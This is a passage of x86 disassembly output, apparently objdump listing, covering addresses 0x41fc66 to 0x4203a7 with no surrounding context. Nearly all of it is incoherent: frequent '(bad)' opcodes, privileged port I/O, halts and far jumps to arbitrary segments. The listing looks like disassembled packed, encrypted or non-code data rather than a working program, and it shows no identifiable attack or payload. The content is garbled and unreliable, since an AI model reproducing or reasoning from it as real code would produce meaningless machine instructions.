  41fc66:	into   
  41fc67:	(bad)  
  41fc69:	outs   dx,BYTE PTR ds:[esi]
  41fc6a:	scas   al,BYTE PTR es:[edi]
  41fc6b:	outs   dx,BYTE PTR ds:[esi]
  41fc6c:	jmp    0x41fc19
  41fc6e:	adc    bh,BYTE PTR [edx+0x21]
  41fc71:	gs mov edx,0xd428e530
  41fc77:	pop    ebp
  41fc78:	nop
  41fc79:	add    al,BYTE PTR [ecx+0xc68522b]
  41fc7f:	daa    
  41fc80:	mov    esp,0x8ee9c212
  41fc85:	jmp    0xf5b3:0x27c2fd65
  41fc8c:	stos   BYTE PTR es:[edi],al
  41fc8d:	lods   al,BYTE PTR ds:[esi]
  41fc8e:	add    eax,0x94787946
  41fc93:	add    al,0xd0
  41fc95:	(bad)
  41fc98:	iret   
  41fc99:	in     eax,0xc2
  41fc9b:	xchg   edx,eax
  41fc9c:	pop    esp
  41fc9d:	xor    bh,BYTE PTR [ebp-0x3d]
  41fca0:	ins    BYTE PTR es:[edi],dx
  41fca1:	xor    BYTE PTR [edx-0x47778aab],cl
  41fca7:	dec    ebx
  41fca8:	or     eax,0xa39137ce
  41fcad:	and    ebp,ecx
  41fcaf:	dec    ebp
  41fcb0:	scas   eax,DWORD PTR es:[edi]
  41fcb1:	sbb    ecx,DWORD PTR [ecx]
  41fcb3:	repz adc esp,DWORD PTR [esi]
  41fcb6:	sbb    dh,BYTE PTR [ecx-0x40]
  41fcb9:	cmp    al,0x93
  41fcbb:	push   0xcbb8aea7
  41fcc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fcc1:	les    eax,FWORD PTR [edx+ecx*2]
  41fcc4:	jl     0x41fcfa
  41fcc6:	mov    eax,ds:0x1b048333
  41fccb:	inc    edx
  41fccc:	loopne 0x41fd1c
  41fcce:	or     eax,ebp
  41fcd0:	mov    ah,ch
  41fcd2:	inc    esp
  41fcd3:	rol    dh,0x34
  41fcd6:	ficom  WORD PTR [ecx-0x48]
  41fcd9:	fist   WORD PTR [ecx+eiz*1-0x6f]
  41fcdd:	push   edi
  41fcde:	jns    0x41fcd9
  41fce0:	mov    ecx,ss
  41fce2:	and    esp,ebp
  41fce4:	dec    edx
  41fce5:	add    al,0x73
  41fce7:	out    0x93,al
  41fce9:	arpl   WORD PTR [ecx-0x75],ax
  41fcec:	pop    edx
  41fced:	mov    ah,0x6c
  41fcef:	les    ebx,FWORD PTR [edi+edx*8+0x7769c79a]
  41fcf6:	hlt    
  41fcf7:	fld    DWORD PTR [eax]
  41fcf9:	and    edx,edi
  41fcfb:	push   eax
  41fcfc:	xchg   esp,eax
  41fcfd:	cmc    
  41fcfe:	mov    eax,0x9fa95960
  41fd03:	fst    QWORD PTR [eax+0x7766d723]
  41fd09:	dec    edx
  41fd0a:	add    eax,DWORD PTR [eax+eiz*2]
  41fd0d:	jbe    0x41fcca
  41fd0f:	call   0x9c3141d8
  41fd14:	lods   eax,DWORD PTR ds:[esi]
  41fd15:	push   edx
  41fd16:	ds cli 
  41fd18:	arpl   WORD PTR [edi+0xafbdd72],di
  41fd1e:	push   edx
  41fd1f:	pop    edi
  41fd20:	cmp    ebp,DWORD PTR [esi+0x7ad93735]
  41fd26:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd27:	out    dx,eax
  41fd28:	mov    ds:0x5cc2472c,al
  41fd2d:	daa    
  41fd2e:	ss popa 
  41fd30:	mov    DWORD PTR [ebp+0x3b9325e0],ebp
  41fd36:	dec    esp
  41fd37:	sub    dl,dl
  41fd39:	or     bl,BYTE PTR [edi+0x5cfb2c64]
  41fd3f:	je     0x41fd70
  41fd41:	out    0x47,eax
  41fd43:	add    al,0xca
  41fd45:	dec    ecx
  41fd46:	shr    BYTE PTR [edx],0x38
  41fd49:	xchg   esp,eax
  41fd4a:	in     al,dx
  41fd4b:	repnz div BYTE PTR [ebp+0x61fea54a]
  41fd52:	add    ebx,DWORD PTR [esi]
  41fd54:	mov    edx,0x74db9a9b
  41fd59:	push   edx
  41fd5a:	or     dh,dh
  41fd5c:	in     eax,dx
  41fd5d:	in     eax,dx
  41fd5e:	call   0xc8965bbc
  41fd63:	shl    al,1
  41fd65:	or     DWORD PTR ds:0x27673e04,edi
  41fd6b:	stos   DWORD PTR es:[edi],eax
  41fd6c:	xor    BYTE PTR [edx],cl
  41fd6e:	sbb    al,0xb3
  41fd70:	idiv   ecx
  41fd72:	ja     0x41fda3
  41fd74:	or     BYTE PTR [edx],cl
  41fd76:	fbld   TBYTE PTR [eax]
  41fd78:	dec    esi
  41fd79:	loopne 0x41fd9d
  41fd7b:	dec    edx
  41fd7c:	xlat   BYTE PTR ds:[ebx]
  41fd7d:	xor    ecx,eax
  41fd7f:	daa    
  41fd80:	sub    eax,0x4084bae8
  41fd85:	mov    ebx,0x5cbc4b48
  41fd8a:	mov    esi,0xdc5fec11
  41fd8f:	pandn  mm2,QWORD PTR [esi+0x59]
  41fd93:	aaa    
  41fd94:	repz xchg esi,eax
  41fd96:	ficomp DWORD PTR [esi-0x1991aa99]
  41fd9c:	jg     0x41fd54
  41fd9e:	xchg   edx,eax
  41fd9f:	in     al,0x15
  41fda1:	(bad)  
  41fda2:	jns    0x41fda2
  41fda4:	mov    bl,0xf7
  41fda6:	mov    di,0xf1a5
  41fdaa:	xlat   BYTE PTR ds:[ebx]
  41fdab:	jecxz  0x41fd63
  41fdad:	or     al,0x5
  41fdaf:	cmc    
  41fdb0:	pop    esi
  41fdb1:	xchg   ebp,eax
  41fdb2:	inc    ebx
  41fdb3:	out    0x44,al
  41fdb5:	jbe    0x41fd47
  41fdb7:	jle    0x41fd56
  41fdb9:	sub    eax,0xac2eef44
  41fdbe:	sbb    eax,0xc63ecdca
  41fdc3:	test   DWORD PTR [eax],esp
  41fdc5:	je     0x41fe20
  41fdc7:	fadd   st(3),st
  41fdc9:	xor    eax,0xdbb4725
  41fdce:	hlt    
  41fdcf:	sti    
  41fdd0:	dec    ebx
  41fdd1:	daa    
  41fdd2:	xor    al,0x47
  41fdd4:	dec    edi
  41fdd5:	test   al,0x5b
  41fdd7:	pop    ss
  41fdd8:	inc    ebp
  41fdd9:	mov    es,WORD PTR [ebx+0x27f5276c]
  41fddf:	mov    dh,0xc6
  41fde1:	sti    
  41fde2:	jb     0x41fe32
  41fde4:	pop    esp
  41fde5:	add    al,0xc1
  41fde7:	xchg   BYTE PTR [esi],dl
  41fde9:	lods   al,BYTE PTR ds:[esi]
  41fdea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fdeb:	cmp    al,0xfb
  41fded:	sbb    esi,DWORD PTR [ebx]
  41fdef:	add    BYTE PTR [ecx-0x5426f7d9],ah
  41fdf5:	in     eax,0xd0
  41fdf7:	jp     0x41fdad
  41fdf9:	inc    ebp
  41fdfa:	or     DWORD PTR [edi+0x25],ebp
  41fdfd:	mov    dl,0xf1
  41fdff:	pop    ebp
  41fe00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe01:	inc    ebp
  41fe02:	loop   0x41fe82
  41fe04:	(bad)  
  41fe06:	jbe    0x41fda4
  41fe08:	xor    al,0x41
  41fe0a:	jnp    0x41fe89
  41fe0c:	ins    DWORD PTR es:[edi],dx
  41fe0d:	mov    bl,0x82
  41fe0f:	ret    
  41fe10:	add    BYTE PTR [edx],bl
  41fe12:	cmp    ah,0xa8
  41fe15:	push   ss
  41fe16:	mov    al,ds:0xa8be0f59
  41fe1b:	loop   0x41fdee
  41fe1d:	mov    ds,eax
  41fe1f:	push   ebx
  41fe20:	retf   0xab47
  41fe23:	pop    ecx
  41fe24:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe26:	(bad)  [eax+0x3a2e5fc]
  41fe2c:	mov    ebp,0x344d8386
  41fe31:	fidiv  WORD PTR [edx-0x5d]
  41fe34:	rol    BYTE PTR [ebx+0x65],0x5d
  41fe38:	cmp    al,0xe8
  41fe3a:	jg     0x41fea7
  41fe3c:	and    dl,BYTE PTR [edi+0x26a8535e]
  41fe42:	pop    esp
  41fe43:	add    edi,DWORD PTR [edx-0x25d3fb4a]
  41fe49:	add    BYTE PTR [edx+0x99f892e],ch
  41fe4f:	cmp    al,0x8b
  41fe51:	push   esi
  41fe52:	mov    eax,ds:0x8386c4e2
  41fe57:	(bad)  
  41fe58:	div    BYTE PTR [ecx]
  41fe5a:	mov    ch,0x63
  41fe5c:	jae    0x41fea3
  41fe5e:	popa   
  41fe5f:	jns    0x41fedb
  41fe61:	dec    edx
  41fe62:	jne    0x41fe8a
  41fe64:	xchg   DWORD PTR [edx-0x1baeae84],ebp
  41fe6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe6b:	mov    al,ds:0x621efb1a
  41fe70:	outs   dx,BYTE PTR ds:[esi]
  41fe71:	repz add edx,DWORD PTR [edi]
  41fe74:	aaa    
  41fe75:	cmp    al,0xd4
  41fe77:	xchg   esi,eax
  41fe78:	or     al,0x92
  41fe7a:	pop    ecx
  41fe7b:	ret    0x1f77
  41fe7e:	out    0xc3,al
  41fe80:	mov    bh,0x81
  41fe82:	mov    eax,0xcaaf0f2d
  41fe87:	sbb    ebx,esi
  41fe89:	pop    ebp
  41fe8a:	lock loopne 0x41fe94
  41fe8d:	hlt    
  41fe8e:	jo     0x41fe5c
  41fe90:	jmp    0x41feb3
  41fe92:	dec    ebp
  41fe93:	inc    ecx
  41fe94:	rcr    bl,0x15
  41fe97:	and    BYTE PTR [esi+ebx*4+0x5e2c7ca4],al
  41fe9e:	addr16 popa 
  41fea0:	cmp    BYTE PTR [ecx],ch
  41fea2:	fsubr  DWORD PTR [edx+ebp*8]
  41fea5:	mov    cl,BYTE PTR [esi]
  41fea7:	iret   
  41fea8:	sbb    BYTE PTR [edx],al
  41feaa:	das    
  41feab:	scas   al,BYTE PTR es:[edi]
  41feac:	xchg   esi,eax
  41fead:	mov    dl,0xe4
  41feaf:	and    ch,BYTE PTR ds:0x971ff5f9
  41feb5:	in     al,dx
  41feb6:	bound  esp,QWORD PTR [ebp+0x6a3abb94]
  41febc:	fs cli 
  41febe:	js     0x41feb8
  41fec0:	lea    edi,ds:0x1352b792
  41fec6:	jle    0x41fefd
  41fec8:	pop    esp
  41fec9:	and    eax,0xbbe7a5de
  41fece:	sub    DWORD PTR [ecx-0x68],esp
  41fed1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fed2:	jmp    0x3d1:0x3e0758f
  41fed9:	jl     0x41ff05
  41fedb:	mov    dl,0x13
  41fedd:	mov    eax,0x1dfe132f
  41fee2:	stos   DWORD PTR es:[edi],eax
  41fee3:	jecxz  0x41fea3
  41fee5:	(bad)  
  41fee6:	imul   ebp,DWORD PTR [eax+0x31357ce],0x48da226f
  41fef0:	or     bh,BYTE PTR [esi+0x2b]
  41fef3:	or     cl,ch
  41fef5:	inc    ecx
  41fef6:	and    eax,0x24bb0363
  41fefb:	(bad)  
  41fefd:	pop    edi
  41fefe:	test   DWORD PTR [esi],ebp
  41ff00:	sub    edi,DWORD PTR [edx]
  41ff02:	ds stos BYTE PTR es:[edi],al
  41ff04:	xchg   edx,eax
  41ff05:	pop    eax
  41ff06:	dec    ecx
  41ff07:	(bad)  
  41ff09:	pop    ecx
  41ff0a:	ins    DWORD PTR es:[edi],dx
  41ff0b:	pop    edx
  41ff0c:	and    ebx,DWORD PTR [ebp+0x77a2c4e7]
  41ff12:	jbe    0x41fee6
  41ff14:	inc    ecx
  41ff15:	push   cs
  41ff16:	es (bad) 
  41ff18:	cdq    
  41ff19:	popa   
  41ff1a:	adc    eax,0xe3f69332
  41ff1f:	adc    ebp,DWORD PTR [ecx]
  41ff21:	xor    al,0x6d
  41ff23:	sbb    al,0xc2
  41ff25:	fistp  DWORD PTR [edi+0xf443019]
  41ff2b:	lock mov dl,0x4e
  41ff2e:	jo     0x41ffa2
  41ff30:	jle    0x41ff57
  41ff32:	repnz and al,0x52
  41ff35:	and    dl,dl
  41ff37:	inc    esi
  41ff38:	arpl   WORD PTR [eax+ebx*1-0x2c],bp
  41ff3c:	stos   DWORD PTR es:[edi],eax
  41ff3d:	inc    BYTE PTR [ecx]
  41ff3f:	xchg   edi,eax
  41ff40:	(bad)  
  41ff41:	mov    WORD PTR ds:0x8f6987cb,ds
  41ff47:	adc    eax,edi
  41ff49:	fidiv  DWORD PTR [ecx]
  41ff4b:	mov    ds:0xc9236ef3,eax
  41ff50:	sbb    eax,0x62b33fb3
  41ff55:	aam    0x87
  41ff57:	adc    BYTE PTR [eax],dl
  41ff59:	bound  ebx,QWORD PTR [edx-0x562ce0a2]
  41ff5f:	enter  0x2dc6,0xf2
  41ff63:	jnp    0x41ff46
  41ff65:	imul   edi,DWORD PTR [ecx-0x34],0x526296e
  41ff6c:	(bad)  
  41ff6d:	retf   0xd74a
  41ff70:	adc    dl,al
  41ff72:	fwait
  41ff73:	ret    0x6c6e
  41ff76:	retf   
  41ff77:	and    ah,BYTE PTR ds:0x99e83343
  41ff7d:	rol    DWORD PTR [ebp+0x6d20f6ff],1
  41ff83:	int    0x5f
  41ff85:	pop    ebx
  41ff86:	jmp    0x41ff2e
  41ff88:	sub    eax,0x448bef7c
  41ff8d:	imul   esi,DWORD PTR [edi+0x5b],0xffffffdd
  41ff91:	mov    esi,0x4a3e73f1
  41ff96:	push   esp
  41ff97:	pop    ds
  41ff98:	and    al,0xd4
  41ff9a:	inc    edx
  41ff9b:	mov    edx,0x959b3419
  41ffa0:	lock jno 0x420010
  41ffa3:	xor    bh,BYTE PTR [ebp+0x68e6718e]
  41ffa9:	ins    BYTE PTR es:[edi],dx
  41ffaa:	pop    ecx
  41ffab:	cwde   
  41ffac:	hlt    
  41ffad:	adc    eax,0x28a9c768
  41ffb2:	jbe    0x41ff4b
  41ffb4:	in     al,0x66
  41ffb6:	pop    esi
  41ffb7:	mov    eax,ds:0x34c90c35
  41ffbc:	out    0x51,eax
  41ffbe:	dec    edi
  41ffbf:	mov    ebx,0x77d3ff3
  41ffc4:	mov    dh,0x98
  41ffc6:	sub    bh,BYTE PTR ds:0xed820af8
  41ffcc:	sub    eax,0x3abcca47
  41ffd1:	shr    DWORD PTR [edx],0x41
  41ffd4:	push   cs
  41ffd5:	mov    ebp,0xeb1e92cd
  41ffda:	push   esi
  41ffdb:	add    ah,bl
  41ffdd:	push   eax
  41ffde:	(bad)  
  41ffdf:	stos   BYTE PTR es:[edi],al
  41ffe0:	dec    edi
  41ffe1:	inc    ecx
  41ffe2:	cmp    dh,al
  41ffe4:	add    bl,BYTE PTR [ecx-0x7a]
  41ffe7:	and    ecx,edx
  41ffe9:	sub    bl,dh
  41ffeb:	addr16 push edi
  41ffed:	mov    edx,0xeef301a1
  41fff2:	jle    0x41ff9c
  41fff4:	int3   
  41fff5:	and    ebx,esp
  41fff7:	imul   ebx,DWORD PTR [edx-0x30],0xb72d3057
  41fffe:	bound  edi,QWORD PTR [esi-0x4a946b46]
  420004:	scas   eax,DWORD PTR es:[edi]
  420005:	sbb    ebx,DWORD PTR [eax-0x40fdcba6]
  42000b:	jmp    0x9985:0xf1ae5d8b
  420012:	test   eax,0xa348e376
  420017:	loope  0x42007f
  420019:	inc    ebx
  42001a:	hlt    
  42001b:	outs   dx,DWORD PTR ds:[esi]
  42001d:	leave  
  42001e:	pop    ds
  42001f:	push   ss
  420020:	mov    DWORD PTR [edx],edx
  420022:	shl    DWORD PTR [ecx+0x5a],0xd1
  420026:	add    al,0x60
  420028:	cwde   
  420029:	outs   dx,BYTE PTR ds:[esi]
  42002a:	xchg   ah,ch
  42002c:	xchg   esp,eax
  42002d:	and    ebp,esi
  42002f:	xor    BYTE PTR [ebx],ch
  420031:	sub    edi,DWORD PTR [ebp+0xe]
  420034:	adc    al,0x37
  420036:	push   edx
  420037:	iret   
  420038:	xchg   esi,ebx
  42003a:	psrlw  mm5,QWORD PTR [edx+0x2695e75b]
  420041:	icebp  
  420042:	sbb    dl,BYTE PTR [esi-0x1c]
  420045:	cmp    ebx,ebp
  420047:	test   DWORD PTR [esi+esi*8-0x3a8a2bc3],edx
  42004e:	jne    0x420022
  420050:	je     0x42009c
  420052:	xchg   esi,eax
  420053:	xor    al,0x46
  420055:	repz iret 
  420057:	xchg   DWORD PTR [edi+0x7aab9677],ebx
  42005d:	xchg   edx,eax
  42005e:	dec    edi
  42005f:	test   DWORD PTR ds:[ebx+0x1bb96f2d],eax
  420066:	or     dh,BYTE PTR [edx-0x6]
  420069:	sbb    esp,ecx
  42006b:	cmp    DWORD PTR [esi+0x602efc13],ebx
  420071:	xchg   edx,eax
  420072:	test   DWORD PTR [eax],eax
  420074:	sbb    BYTE PTR [ebx],dh
  420076:	sbb    BYTE PTR [eax+0x5e0a8c],al
  42007c:	rcl    ecx,cl
  42007e:	fyl2xp1 
  420080:	mov    dl,0xe2
  420082:	pop    esp
  420083:	inc    esi
  420084:	retf   0x3c36
  420087:	out    dx,al
  420088:	out    dx,al
  420089:	fldcw  WORD PTR [ecx]
  42008b:	mov    eax,edi
  42008d:	inc    ebp
  42008e:	(bad)  
  42008f:	jg     0x42002e
  420091:	loopne 0x42002e
  420093:	pop    ecx
  420094:	ins    BYTE PTR es:[edi],dx
  420095:	pusha  
  420096:	xor    BYTE PTR [edi],cl
  420098:	mov    ah,0xb2
  42009a:	imul   DWORD PTR es:[eax]
  42009d:	pop    ecx
  42009e:	mov    bl,ch
  4200a0:	loop   0x420034
  4200a2:	dec    edx
  4200a3:	loope  0x42003a
  4200a5:	push   ebp
  4200a6:	jmp    0x4fdaaa9e
  4200ab:	jmp    0x4200a9
  4200ad:	xor    al,0x8e
  4200af:	mov    bh,0x97
  4200b1:	ja     0x4200d0
  4200b3:	int    0x2c
  4200b5:	adc    BYTE PTR [eax-0x29d46863],dl
  4200bb:	dec    eax
  4200bc:	mov    ds:0xca36a8dd,eax
  4200c1:	mov    bh,0x6f
  4200c3:	aas    
  4200c4:	ds mov edi,0x6faac63d
  4200ca:	mov    dl,ch
  4200cc:	bound  edx,QWORD PTR [esi-0x331932a]
  4200d2:	inc    ecx
  4200d3:	fdivr  st(3),st
  4200d5:	mov    al,ds:0x949ccbc4
  4200da:	jnp    0x4200c1
  4200dc:	pop    esp
  4200dd:	ss sbb eax,0xeb62ba76
  4200e3:	mov    ch,0x85
  4200e5:	and    BYTE PTR [ebx-0x6bf688ea],bh
  4200eb:	mov    eax,ds:0xafac8ecd
  4200f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4200f1:	das    
  4200f2:	and    bl,BYTE PTR [edx-0x22]
  4200f5:	push   ss
  4200f6:	inc    edi
  4200f7:	cmp    DWORD PTR [ecx+edx*1+0x73],ebx
  4200fb:	fld    st(3)
  4200fd:	or     al,0x1e
  4200ff:	stos   DWORD PTR es:[edi],eax
  420100:	fldcw  WORD PTR [esi]
  420102:	lahf   
  420103:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420104:	icebp  
  420105:	xchg   edx,eax
  420106:	es jg  0x4200fe
  420109:	mov    edx,0xa718df5f
  42010e:	xchg   ecx,eax
  42010f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420110:	retf   
  420111:	imul   edx,ebx,0x3c27f220
  420117:	or     dl,BYTE PTR [edx+ecx*8]
  42011a:	ret    0x2ac3
  42011d:	inc    edi
  42011e:	fld    TBYTE PTR [ecx-0x4e]
  420121:	add    ch,BYTE PTR [ebx-0x1bdb509a]
  420127:	stos   BYTE PTR es:[edi],al
  420128:	adc    DWORD PTR [eax+0xff552c2],edi
  42012e:	pop    edx
  42012f:	xor    eax,0xeb054e7d
  420134:	fild   WORD PTR [ecx-0x7f439280]
  42013a:	mov    ebp,0xb1de4911
  42013f:	ret    
  420140:	(bad)  
  420141:	enter  0x7b7d,0x30
  420145:	ins    BYTE PTR es:[edi],dx
  420146:	dec    esp
  420147:	sbb    eax,0x5d23fc73
  42014c:	mov    eax,0xbc25a60f
  420151:	jae    0x42017e
  420153:	int3   
  420154:	pop    es
  420155:	xchg   edi,eax
  420156:	xor    al,0xc0
  420158:	add    ch,0x54
  42015b:	push   0xf527b16a
  420160:	mov    bh,0xb1
  420162:	mov    dh,0xb
  420164:	lods   eax,DWORD PTR ds:[esi]
  420165:	dec    ebp
  420166:	and    cl,ah
  420168:	inc    ebx
  420169:	nop
  42016a:	call   0x294:0x5b98172f
  420171:	out    dx,eax
  420172:	inc    edx
  420173:	mov    esi,0xf0ca7f4c
  420178:	aas    
  420179:	mov    ecx,0xe87bf5bd
  42017e:	mov    WORD PTR [ebx+0x37],?
  420181:	pop    esp
  420182:	nop
  420183:	cmp    ebp,edx
  420185:	cmovae esp,DWORD PTR [edi]
  420188:	daa    
  420189:	stos   DWORD PTR es:[edi],eax
  42018a:	dec    edi
  42018b:	or     ebp,ebx
  42018d:	push   ebp
  42018e:	inc    esi
  42018f:	mov    ecx,0x4baabe3b
  420194:	add    dh,BYTE PTR cs:[esi+0x6d]
  420198:	aas    
  420199:	sub    dh,BYTE PTR [edx+0xd]
  42019c:	add    DWORD PTR [ebp-0x5005fd5b],ecx
  4201a2:	mov    esi,0xa11336a9
  4201a7:	add    eax,0xf72a2c32
  4201ac:	jp     0x420229
  4201ae:	and    bh,BYTE PTR [edx-0x5c9fb9ff]
  4201b4:	sbb    DWORD PTR [ebx+edx*2],ebp
  4201b7:	xchg   edx,eax
  4201b8:	cmp    al,0x7f
  4201ba:	mov    ebp,0x3c16c1ed
  4201bf:	data16 in al,0x3a
  4201c2:	imul   edx,DWORD PTR [ebx-0x7d0e6c07],0x5f3a3124
  4201cc:	ds dec esp
  4201ce:	sbb    al,0x4c
  4201d0:	xor    DWORD PTR [ecx-0x31830054],ebx
  4201d6:	push   ecx
  4201d7:	es xchg ecx,eax
  4201d9:	pusha  
  4201da:	fs leave 
  4201dc:	into   
  4201dd:	xchg   esp,eax
  4201de:	dec    edi
  4201df:	shr    edi,cl
  4201e1:	das    
  4201e2:	jmp    0x832714b4
  4201e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4201e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4201e9:	out    dx,eax
  4201ea:	mov    ch,BYTE PTR [edx-0xcd814c3]
  4201f0:	sbb    BYTE PTR [ebp+0x45],dh
  4201f3:	push   eax
  4201f4:	aam    0x26
  4201f6:	dec    edi
  4201f7:	in     eax,0x36
  4201f9:	test   BYTE PTR [eax+0x3463c5dc],dh
  4201ff:	(bad)  
  420200:	retf   
  420201:	sbb    al,0x2f
  420203:	stos   DWORD PTR es:[edi],eax
  420204:	(bad)  
  420205:	push   edx
  420206:	outs   dx,DWORD PTR ds:[esi]
  420207:	inc    ebp
  420208:	aam    0x80
  42020a:	rol    DWORD PTR [eax+0x51],0x37
  42020e:	out    0x5a,al
  420210:	adc    BYTE PTR [edi+0x1aa69b19],dl
  420216:	push   ds
  420217:	ret    
  420218:	pop    ebx
  420219:	pusha  
  42021a:	dec    ebp
  42021b:	pop    eax
  42021c:	je     0x4201f5
  42021e:	inc    eax
  42021f:	ret    0xdc46
  420222:	xchg   BYTE PTR [edx],ah
  420224:	clc    
  420225:	and    edx,DWORD PTR [ebx+0x8]
  420228:	jg     0x4201f5
  42022a:	leave  
  42022b:	xchg   eax,esp
  42022d:	dec    ebp
  42022e:	mov    ebx,0x3876a2f0
  420233:	(bad)  
  420234:	in     eax,0xcf
  420236:	xchg   BYTE PTR [ebx+0x3c],cl
  420239:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42023a:	lock std 
  42023c:	inc    ebx
  42023d:	cli    
  42023e:	jecxz  0x420285
  420240:	sub    DWORD PTR [esp+ebp*4],esi
  420243:	sbb    eax,0xf77acb7e
  420248:	adc    DWORD PTR [ebp+eiz*8+0x60],0x4f
  42024d:	rol    BYTE PTR [bp+si+0x1460],0x28
  420253:	in     al,dx
  420254:	retf   0x8491
  420257:	outs   dx,DWORD PTR ds:[esi]
  420258:	xor    dl,BYTE PTR [esi-0x68]
  42025b:	sub    DWORD PTR [ebp-0x308fdcf1],esi
  420261:	mov    bl,BYTE PTR [edx]
  420263:	cmp    esi,ebp
  420265:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420266:	pop    ds
  420267:	cmp    ecx,DWORD PTR [edx]
  420269:	test   al,0xa4
  42026b:	mov    dl,0x3
  42026d:	outs   dx,DWORD PTR ds:[esi]
  42026e:	nop
  42026f:	test   DWORD PTR [edi+0x3a],edx
  420272:	push   ecx
  420273:	std    
  420274:	lods   eax,DWORD PTR ds:[esi]
  420275:	pop    edi
  420276:	aas    
  420277:	sar    DWORD PTR [edi+0x4],cl
  42027a:	adc    bh,BYTE PTR [ecx]
  42027c:	pop    eax
  42027d:	pop    es
  42027e:	xchg   ebx,eax
  42027f:	test   al,0xef
  420281:	or     BYTE PTR [ecx],0x62
  420284:	out    dx,al
  420285:	adc    BYTE PTR es:[edx+eiz*8],cl
  420289:	repnz in eax,dx
  42028b:	das    
  42028c:	xchg   esi,eax
  42028d:	inc    ebx
  42028e:	cmp    eax,0x88f0d146
  420293:	xor    BYTE PTR [edi],0x6d
  420296:	sbb    BYTE PTR [esi],ch
  420298:	ds jle 0x4202a2
  42029b:	cmp    cl,BYTE PTR [ecx-0x3bdd2f53]
  4202a1:	inc    ebp
  4202a2:	push   ss
  4202a3:	cwde   
  4202a4:	sahf   
  4202a5:	dec    eax
  4202a6:	je     0x42022c
  4202a8:	or     al,0x88
  4202aa:	stos   DWORD PTR es:[edi],eax
  4202ab:	scas   eax,DWORD PTR es:[edi]
  4202ac:	loopne 0x420245
  4202ae:	ja     0x4202a7
  4202b0:	les    edx,FWORD PTR [edx]
  4202b2:	out    dx,eax
  4202b3:	add    BYTE PTR [eax-0x52],al
  4202b6:	fdivrp st(5),st
  4202b8:	inc    ecx
  4202ba:	xor    edi,0xa439be55
  4202c0:	dec    edx
  4202c1:	sbb    DWORD PTR [esp+ebx*1+0x89e5326],esi
  4202c8:	push   0x67
  4202ca:	scas   al,BYTE PTR es:[edi]
  4202cb:	sar    DWORD PTR [ecx+0x11637404],0x1a
  4202d2:	arpl   WORD PTR [edx+eiz*4+0x17],cx
  4202d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4202d7:	cli    
  4202d8:	bnd ret 0xf7bc
  4202dc:	sti    
  4202dd:	push   edx
  4202de:	pop    ebx
  4202df:	sub    al,0x5e
  4202e1:	leave  
  4202e2:	dec    ebp
  4202e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4202e4:	pop    ecx
  4202e5:	pusha  
  4202e6:	aas    
  4202e7:	or     BYTE PTR ds:[ebp-0x20],cl
  4202eb:	fwait
  4202ec:	cli    
  4202ed:	call   0x2e4fe7
  4202f2:	mov    edx,cr2
  4202f5:	adc    bh,ch
  4202f7:	fcmovnu st,st(1)
  4202f9:	xor    bh,BYTE PTR [edx]
  4202fb:	xchg   edx,eax
  4202fc:	out    0xaf,eax
  4202fe:	out    dx,eax
  4202ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420300:	pushf  
  420301:	test   bh,dl
  420303:	jmp    0x8cc4:0xb3974282
  42030a:	fwait
  42030b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42030c:	test   cl,bl
  42030e:	leave  
  42030f:	mov    bh,0x55
  420311:	fisttp DWORD PTR [ebp+0x423411b1]
  420317:	pop    ebp
  420318:	les    esi,FWORD PTR [eax]
  42031a:	xchg   esp,eax
  42031b:	push   ebp
  42031c:	pop    edx
  42031d:	mov    eax,ds:0x3cfd7ceb
  420322:	ror    DWORD PTR [ebp+ecx*1-0x25],1
  420326:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420327:	sub    BYTE PTR [ebx+0x4b4d5a98],bh
  42032d:	xchg   edx,eax
  42032e:	dec    ebp
  42032f:	jno    0x4202fd
  420331:	xchg   esp,eax
  420332:	imul   esp,DWORD PTR [edx-0x1f],0xb7c15d4d
  420339:	loopne 0x420328
  42033b:	mov    cl,0x22
  42033d:	inc    esp
  42033e:	stos   DWORD PTR es:[edi],eax
  42033f:	inc    esp
  420340:	dec    bx
  420342:	dec    esp
  420343:	jnp    0x4202e2
  420345:	test   al,0xe2
  420348:	scas   al,BYTE PTR es:[edi]
  420349:	(bad)  
  42034a:	fist   WORD PTR [ecx-0x5d8d8a24]
  420350:	(bad)  
  420351:	mov    WORD PTR [ecx],gs
  420353:	xchg   ecx,eax
  420354:	cmp    ah,BYTE PTR [esi+0x683c796d]
  42035a:	push   ecx
  42035b:	js     0x420354
  42035d:	adc    DWORD PTR [esi+0x76a46182],ecx
  420363:	xor    BYTE PTR [ecx+eax*1-0x4351430f],bh
  42036a:	popa   
  42036b:	push   edi
  42036c:	push   eax
  42036d:	shl    BYTE PTR [eax+0x4ea0c94c],1
  420373:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420374:	mov    al,0xc6
  420376:	in     eax,dx
  420377:	pusha  
  420378:	(bad)
  42037b:	fiadd  DWORD PTR [edi+0x15]
  42037e:	mov    edx,edi
  420380:	sub    eax,0x879eb9aa
  420385:	(bad)  
  420386:	jnp    0x420348
  420388:	fist   DWORD PTR [ebp+0x3e1707df]
  42038e:	or     eax,0xc22c917f
  420393:	and    edx,esp
  420395:	call   0xe9d1:0xb812d7dd
  42039c:	push   ebx
  42039d:	jp     0x42039f
  42039f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4203a0:	fdivr  st(1),st
  4203a2:	inc    ecx
  4203a3:	push   ecx
  4203a4:	cmc    
  4203a5:	fist   WORD PTR [edx]
  4203a7:	jle    0x420425
